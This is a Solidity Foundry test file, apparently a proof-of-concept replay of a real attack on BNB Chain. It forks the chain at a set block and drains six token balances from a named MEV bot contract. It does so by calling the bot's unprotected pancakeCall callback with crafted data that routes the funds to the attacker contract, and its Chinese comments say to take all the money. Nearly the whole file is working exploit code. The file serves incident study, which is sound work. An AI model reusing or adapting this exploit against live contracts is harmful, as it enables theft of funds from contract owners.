pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// https://www.levi104.com/categories/08-PoC/

contract Attacker is Test {

    IMEVBOT public mevbot = IMEVBOT(address(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d));

    IBSCUSD public BSCUSD = IBSCUSD(address(0x55d398326f99059fF775485246999027B3197955));
    IWBNB public WBNB = IWBNB(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IBUSD public BUSD = IBUSD(address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56));
    IUSDC public USDC = IUSDC(address(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d));
    IBTCB public BTCB = IBTCB(address(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c));
    IETH public ETH = IETH(address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8));

    address public token0;
    address public token1;

    function setUp() public {
        vm.createSelectFork("bsc", 21_297_409);

        vm.label(address(mevbot), "mevbot");
        vm.label(address(BSCUSD), "BSCUSD");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(USDC), "USDC");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(ETH), "ETH");
    }

    function test_Exploit() public {
        emit log_named_decimal_uint("[Start] Attacker BSCUSD balance before exploit", BSCUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD balance before exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BTCB balance before exploit", BTCB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", ETH.balanceOf(address(this)), 18);

        // 下面分别进行6次攻击

        // 01
        (token0, token1) = (address(BSCUSD), address(BSCUSD));
        // 拿完所有钱
        uint256 BSCUSD_balance = BSCUSD.balanceOf(address(mevbot));
        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        // 构造varg3
        bytes memory data01 = abi.encodePacked(
            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)
        );
        mevbot.pancakeCall(address(this), BSCUSD_balance, 0, data01);

        // 02
        (token0, token1) = (address(WBNB), address(WBNB));
        uint256 WBNB_balance = WBNB.balanceOf(address(mevbot));
        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        bytes memory data02 = abi.encodePacked(
            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)
        );
        mevbot.pancakeCall(address(this), WBNB_balance, 0, data02);

        // 03
        (token0, token1) = (address(BUSD), address(BUSD));
        uint256 BUSD_balance = BUSD.balanceOf(address(mevbot));
        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        bytes memory data03 = abi.encodePacked(
            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)
        );
        mevbot.pancakeCall(address(this), BUSD_balance, 0, data03);

        // 04
        (token0, token1) = (address(USDC), address(USDC));
        uint256 USDC_balance = USDC.balanceOf(address(mevbot));
        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        bytes memory data04 = abi.encodePacked(
            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)
        );
        mevbot.pancakeCall(address(this), USDC_balance, 0, data04);

        // 05
        (token0, token1) = (address(BTCB), address(BTCB));
        uint256 BTCB_balance = BTCB.balanceOf(address(mevbot));
        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        bytes memory data05 = abi.encodePacked(
            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)
        );
        mevbot.pancakeCall(address(this), BTCB_balance, 0, data05);

        // 06
        (token0, token1) = (address(ETH), address(ETH));
        uint256 ETH_balance = ETH.balanceOf(address(mevbot));
        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        bytes memory data06 = abi.encodePacked(
            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)
        );
        mevbot.pancakeCall(address(this), ETH_balance, 0, data06);

        console.log();
        emit log_named_decimal_uint("[After] Attacker BSCUSD balance before exploit", BSCUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker BUSD balance before exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker BTCB balance before exploit", BTCB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker ETH balance before exploit", ETH.balanceOf(address(this)), 18);
    }

    function swap(uint256 amount0, uint256 amount1, address to, bytes calldata data) public {
        // 没啥用，只是因为MEV机器人合约需要回调 调用者 的swap方法，因此需要补一下这个方法
    }

}
